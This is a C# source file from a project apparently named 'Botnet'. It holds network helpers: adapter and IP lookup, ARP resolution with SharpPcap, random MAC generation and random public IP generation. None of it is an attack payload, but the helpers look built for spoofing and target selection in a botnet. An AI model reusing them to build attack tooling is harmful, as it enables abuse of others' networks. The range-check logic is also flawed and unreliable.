using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using SharpPcap.LibPcap;
using SharpPcap;

namespace Botnet
{
    public static class NetworkInstruments
    {
        public static IPAddress getLocaIP()
        {
            IPHostEntry Entry = Dns.GetHostEntry(Dns.GetHostName());
            foreach (IPAddress ip in Entry.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    return ip;
                }
            }
            throw new Exception(); //Internetworkipnotfound

        }
        public static IPAddress getAdapterIPAddress(NetworkInterface Adapter)
        {
            UnicastIPAddressInformationCollection AddressList = Adapter.GetIPProperties().UnicastAddresses;
            foreach (UnicastIPAddressInformation info in AddressList)
            {
                if (info.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                {
                    return info.Address;
                }
            }
            return IPAddress.Any;
        }
        public static NetworkInterface getAnyAdaptor()
        {
            return NetworkInterface.GetAllNetworkInterfaces()
            .Where(n => n.OperationalStatus == OperationalStatus.Up && n.NetworkInterfaceType != NetworkInterfaceType.Loopback)
            .OrderByDescending(n => n.NetworkInterfaceType == NetworkInterfaceType.Ethernet).First();
        }
        public static PhysicalAddress ResolveMac(NetworkInterface device, IPAddress Instance)
        {
            ARP Resolver = new ARP((LibPcapLiveDevice)NetworkInstruments.getActiveDevice(device.GetPhysicalAddress()));
            Resolver.Timeout = new TimeSpan(0, 0, 4);
            return Resolver.Resolve(Instance, getAdapterIPAddress(device), device.GetPhysicalAddress());
        }
        public static PhysicalAddress GetRandomMac(ref Random Randomizer)
        {
            byte[] add = new byte[6];
            Randomizer.NextBytes(add);
            return new PhysicalAddress(add);
        }
        public static ICaptureDevice getActiveDevice(PhysicalAddress MyActiveIntAddress)
        {
            CaptureDeviceList Devices = CaptureDeviceList.Instance;
            for (int i = 0; i < Devices.Count; ++i)
            {
                Devices[i].Open();
                if (Devices[i].MacAddress.Equals(MyActiveIntAddress)) return Devices[i];
                Devices[i].Close();
            }
            throw new Exception(); // no connection
        }
        public static bool CompareMacs(byte[] firts, byte[] second)  //return true if the first one is bigger
        {
            for (int i = 0; i < 6; ++i)
            {
                if (firts[i] > second[i]) return true;
            }
            return false;
        }
        public static bool pointsEqual(IPEndPoint A, IPEndPoint B)
        {
            if (A == null || B == null) return false;
            if ((A.Address.ToString() == B.Address.ToString()) && A.Port == B.Port) return true;
            else return false;
        }
        public struct AddressPool
        {
            IPAddress StartAddress;
            IPAddress EndAddress;
            public AddressPool(IPAddress Start, IPAddress End) // check if second < fisrt throw exception
            {

                int startaddress = BitConverter.ToInt32(Start.GetAddressBytes(), 0);  //perhaps need to reverse
                int endaddress = BitConverter.ToInt32(End.GetAddressBytes(), 0);
                if (startaddress > endaddress) throw new Exception();
                StartAddress = Start;
                EndAddress = End;
            }
            public IPAddress this[int index]
            {
                get
                {
                    if (index == 0) return StartAddress;
                    else return EndAddress;
                }
                set
                {
                    if (index == 0) StartAddress = value;
                    else EndAddress = value;
                }
            }
            public static bool operator !=(AddressPool A, AddressPool B)
            {
                return !(A == B);
            }
            public static bool operator ==(AddressPool A, AddressPool B)
            {
                if ((A.StartAddress == B.StartAddress) && (A.EndAddress == B.EndAddress)) return true;
                else return false;
            }
            /*
             *
               Only testing
             */

        }
        sealed public class IpRandomizer
        {
            public NetworkInstruments.AddressPool RestrictedPool { get; set; }

            public IpRandomizer()
            { }
            private bool inRange(IPAddress instance, IPAddress low, IPAddress up)
            {
                byte[] addressBytes = instance.GetAddressBytes();
                byte[] lowerBytes = low.GetAddressBytes();
                byte[] upperBytes = up.GetAddressBytes();
                bool lowerBoundary = true, upperBoundary = true;
                for (int i = 0; i < lowerBytes.Length &&
                    (lowerBoundary || upperBoundary); i++)
                {
                    if ((lowerBoundary && addressBytes[i] < lowerBytes[i]) ||
                        (upperBoundary && addressBytes[i] > upperBytes[i]))
                    {
                        return false;
                    }

                    lowerBoundary &= (addressBytes[i] == lowerBytes[i]);
                    upperBoundary &= (addressBytes[i] == upperBytes[i]);
                }

                return true;
            }
            public IPAddress GetNext(ref Random Randomizer, NetworkInstruments.AddressPool RestrictedPoll) //does ref really needed?
            {
                IPAddress Address = new IPAddress(new Byte[] { (byte)Randomizer.Next(1, 255), (byte)Randomizer.Next(0, 255), (byte)Randomizer.Next(0, 255), (byte)Randomizer.Next(0, 255) });
                if (!(inRange(Address, RestrictedPoll[0], RestrictedPoll[1])
                       && inRange(Address, IPAddress.Parse("10.0.0.0"), IPAddress.Parse("10.255.255.255"))
                       && inRange(Address, IPAddress.Parse("172.16.0.0"), IPAddress.Parse("172.31.255.255"))
                       && inRange(Address, IPAddress.Parse("192.168.0.0"), IPAddress.Parse("192.168.255.255"))
                      )
                   ) return Address;
                else return GetNext(ref Randomizer, RestrictedPoll);
            }

        }
        sealed public class Address
        {
            private byte[] _bytes;
            public Address(byte oct1, byte oct2, byte oct3, byte oct4)
            {
                _bytes = new byte[] { oct1, oct2, oct3, oct4 };
            }
            public Address(Address add)
            {
                _bytes = new byte[] { add._bytes[0], add._bytes[1], add._bytes[2], add._bytes[3] };
            }
            public Address(string address)
            {
                string[] octets = address.Split('.');
                if (octets.Length != 4) throw new ArgumentException();
                _bytes = new byte[4];
                try
                {
                    for (int i = 0; i < 4; ++i)
                    {
                        _bytes[i] = Convert.ToByte(octets[i]);
                    }
                }
                catch (Exception)
                {

                    throw new ArgumentException();
                }
            }
            public Address()
            {
                _bytes = new byte[4];
            }
            public byte this[int index]
            {
                get
                {
                    return _bytes[index];
                }
                set
                {
                    _bytes[index] = value;
                }
            }
            public static Address operator &(Address A, Address B)
            {
                Address Res = new Address();
                for (int i = 0; i < 4; ++i)
                {
                    Res[i] = (byte)(A[i] & B[i]);
                }
                return Res;
            }
            public static Address operator |(Address A, Address B)
            {
                Address Res = new Address();
                for (int i = 0; i < 4; ++i)
                {
                    Res[i] = (byte)(A[i] | B[i]);
                }
                return Res;
            }
            public static Address operator ~(Address A)
            {
                Address Inverted = new Address();
                for (int i = 0; i < 4; ++i)
                {
                    Inverted[i] = (byte)~A[i];
                }
                return Inverted;
            }
            public static bool operator ==(Address A, Address B)
            {
                for (int i = 0; i < 4; ++i)
                {
                    if (A[i] != B[i]) return false;
                }
                return true;
            }
            public static bool operator !=(Address A, Address B)
            {
                for (int i = 0; i < 4; ++i)
                {
                    if (A[i] != B[i]) return true;
                }
                return false;
            }
            public override bool Equals(object obj)
            {
                if (obj == null) return false;
                Address add = obj as Address;
                if ((object)add == null)
                {
                    return false;
                }
                if (this == add) return true;
                else return false;
            }
            public override int GetHashCode()
            {
                return base.GetHashCode();
            }
            public override string ToString()
            {
                return Convert.ToString(_bytes[0]) + "." + Convert.ToString(_bytes[1]) + "." + Convert.ToString(_bytes[2]) + "." + Convert.ToString(_bytes[3]);
            }
            //операции 
        }
    }
}
